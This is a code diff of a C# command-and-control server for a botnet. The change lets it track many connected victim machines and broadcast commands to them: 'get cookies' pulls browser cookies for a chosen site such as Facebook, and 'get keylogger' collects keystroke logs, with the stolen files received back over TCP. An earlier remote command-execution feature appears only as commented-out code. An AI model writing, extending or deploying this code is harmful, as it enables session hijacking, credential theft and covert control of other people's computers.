@@ -8,16 +8,22 @@ using System.Threading.Tasks;
 using System.Runtime.Remoting.Channels;
 using System.IO;
 using System.Runtime.InteropServices.ComTypes;
+using System.Threading;
+using System.Collections;
 
 namespace Control
 {
      class Program
     {
-        //static IPAddress address = IPAddress.Parse("192.168.1.102");
-        //static TcpListener listener = new TcpListener(address, 6969);
+
+        static Dictionary<TcpClient, string> clients = new Dictionary<TcpClient, string>();
+
         private const int BUFFER_SIZE = 1024;
         private const int PORT_NUMBER = 9669;
+     
+
         static ASCIIEncoding encoding = new ASCIIEncoding();
+
         static void Main(string[] args)
         {
             try
@@ -33,27 +39,62 @@ namespace Control
                 Console.WriteLine("Server started on " + listener.LocalEndpoint);
                 Console.WriteLine("Waiting for a connection...");
 
+                Thread th_server_listener = new Thread(() => handleConnectSocket(listener));
+                th_server_listener.Start();
 
+                Thread th_server_handleCommand = new Thread(() => handleControlBot(listener));
+                th_server_handleCommand.Start();
+
+                //TcpClient tcplient = listener.AcceptTcpClient();
+                // Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
+                // Socket socket = listener.AcceptSocket();
+
+
+                //while (true)
+                //{
+                //    Console.WriteLine(" Command & Control Center");
+                //    Console.Write("Enter your command: ");
+                //    string command = Console.ReadLine();
+
+                //    // handleCommand(command,socket);
+                //    handleCommand(command);
+                //}
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex);
+            }
+        }
+        public static void handleConnectSocket(TcpListener listener)
+        {
+            while (true)
+            {
                 TcpClient tcplient = listener.AcceptTcpClient();
-
                 Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
-               // Socket socket = listener.AcceptSocket();
+                string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).Address.ToString();
 
+                clients.Add(tcplient, clientName);
 
-                while (true)
+                // Thread clientThread = new Thread(() => handleControlBot(clientSocket));
+                // clientThread.Start();
+            }
+
+        }
+        public static void handleControlBot(TcpListener listener)
+        {
+            while (true)
+            {
+                if(clients.Count > 0)
                 {
                     Console.WriteLine(" Command & Control Center");
                     Console.Write("Enter your command: ");
                     string command = Console.ReadLine();
 
                     // handleCommand(command,socket);
-                    handleCommand(command, tcplient);
-                }
-
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error: " + ex);
+                    handleCommand(command);
+                }    
+                
             }
         }
 
@@ -102,98 +143,70 @@ namespace Control
                 fs.Write(data, 0, dataLength);
                 fs.Close();
          }    
-        public static void handleCommand(string command,TcpClient client )
+        public static void handleCommand(string command)
         {
-            Socket socket = client.Client;
+            //Socket socket = client.Client;
             command = command.Trim().ToLower();
             if(command == "clear")
             {
                 Console.Clear();
-
             } 
             else if(command == "exit")
             {
-                //socket.Send(encoding.GetBytes("exit"));
 
-                sendMessageSocket("exit", socket);
-                Console.WriteLine("Sending exit command...");
-
-                // receive message
-                //byte[] data = new byte[BUFFER_SIZE];
-                //socket.Receive(data);
-                //Console.WriteLine("Client: " + encoding.GetString(data));
-
-
-                string messageReceive = receiveMessageSocket(socket);
-                Console.WriteLine("Client: " + messageReceive);
-
+                //sendMessageSocket("exit", socket);
+                //Console.WriteLine("Sending exit command...");
+                //string messageReceive = receiveMessageSocket(socket);
+                //Console.WriteLine("Client: " + messageReceive);
             }
             else if(command== "get cookies")
             {
-                
                 Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
                 string url = Console.ReadLine();
                 string ms = "cookies?" + url + "?";
 
-
-                //Console.WriteLine(ms);
-                //socket.Send(encoding.GetBytes(ms));
-
-                sendMessageSocket(ms, socket);
-                Console.WriteLine("Sending request get cookies...");
-
-
-                receiveFileSocket(client,"cookies");
-                Console.WriteLine("Receive cookies complete!");
-
-
-
-                //byte[] data = new byte[BUFFER_SIZE];
-                //socket.Receive(data);
-                //Console.WriteLine("Client: " + encoding.GetString(data));
-                //byte[] buffer = new byte[1024];
-                //int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                //string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                //Console.WriteLine("Client: " + message);
-
+                foreach (var cli in clients.Keys)
+                {
+                    Thread th_cli = new Thread(() => {
+                        sendMessageSocket(ms, cli.Client);
+                        Console.WriteLine("Sending request get cookies...");
+                        receiveFileSocket(cli, "cookies");
+                        Console.WriteLine("Receive cookies complete!");
+                    });
+                    th_cli.Start();
+                }
+                //sendMessageSocket(ms, socket);
+                //Console.WriteLine("Sending request get cookies...");
+                //receiveFileSocket(client,"cookies");
+                //Console.WriteLine("Receive cookies complete!");
             }
             else if (command == "get keylogger")
             {
+               
 
-                //<------send message example------->
-                //socket.Send(encoding.GetBytes("keylogger"));
-                //Console.WriteLine("Sending request get keylogger...");
-                //byte[] data = new byte[BUFFER_SIZE];
-                //socket.Receive(data);
-                //Console.WriteLine("Client: " + encoding.GetString(data));
-
-                //<------send message & receive file ------->
-
-
-                //socket.Send(encoding.GetBytes("keylogger"));
-                sendMessageSocket("keylogger", socket);
-                Console.WriteLine("Sending request get keylogger...");
-                receiveFileSocket(client, "keylogger");
-                Console.WriteLine("Receive keylogger complete!");
-
-
+                foreach (var cli in clients.Keys)
+                {
+                    Thread th_cli = new Thread(() => {
+                        
+                        clients.TryGetValue(cli, out string ip);
+                        sendMessageSocket("keylogger", cli.Client);
+                        Console.WriteLine("Sending request get keylogger to "+ ip+"...");
+                        receiveFileSocket(cli, "keylogger");
+                        Console.WriteLine("Receive keylogger from "+ip+"!");
+                    });
+                    th_cli.Start();
+                }
             }
             else if (command == "run cmd command")
             {
-                string cmd = "";
-                Console.Write("Enter command:");
-                cmd = Console.ReadLine();
-                string ms = "run cmd command " + cmd;
-
-
-                sendMessageSocket(ms,socket);
-                Console.WriteLine("Sending request run cmd command...");
-
-
-                receiveFileSocket(client, "cmd");
-                Console.WriteLine("Receive rs command complete!");
-
-
+                //string cmd = "";
+                //Console.Write("Enter command:");
+                //cmd = Console.ReadLine();
+                //string ms = "run cmd command " + cmd;
+                //sendMessageSocket(ms,socket);
+                //Console.WriteLine("Sending request run cmd command...");
+                //receiveFileSocket(client, "cmd");
+                //Console.WriteLine("Receive rs command complete!");
             }
             else if (command == "read keylogger")
             {
@@ -229,6 +242,9 @@ namespace Control
             }
                
         }
+      
+            
+        
         public static void sendMessageSocket(string message,Socket socket)
         {
             socket.Send(encoding.GetBytes(message));
